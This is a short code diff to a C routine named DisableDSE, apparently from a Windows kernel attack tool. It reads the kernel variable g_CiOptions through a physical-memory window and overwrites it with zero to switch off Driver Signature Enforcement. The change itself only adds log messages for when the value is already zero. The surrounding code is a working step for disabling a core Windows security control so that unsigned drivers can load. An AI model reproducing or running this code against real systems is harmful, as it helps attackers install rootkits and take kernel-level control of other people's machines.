@@ -245,13 +245,16 @@ bool DisableDSE(ULONG64 systemCr3, KernelOffsets* offsets) {
 
     ULONG before = WindowRead32(pa);
     printf("[*] g_CiOptions = 0x%08X\n", before);
+    if (before == 0)
+        printf("[!] Already 0 - DSE was not enforcing, this step has nothing to do\n");
 
     ULONG zero = 0;
     WindowWriteBuffer(pa, &zero, sizeof(zero));
 
     ULONG after = WindowRead32(pa);
     if (after == 0) {
-        printf("[+] DSE disabled (g_CiOptions = 0)\n");
+        if (before == 0) printf("[+] g_CiOptions still 0 (unchanged)\n");
+        else printf("[+] DSE disabled (0x%08X -> 0)\n", before);
         return true;
     }
 
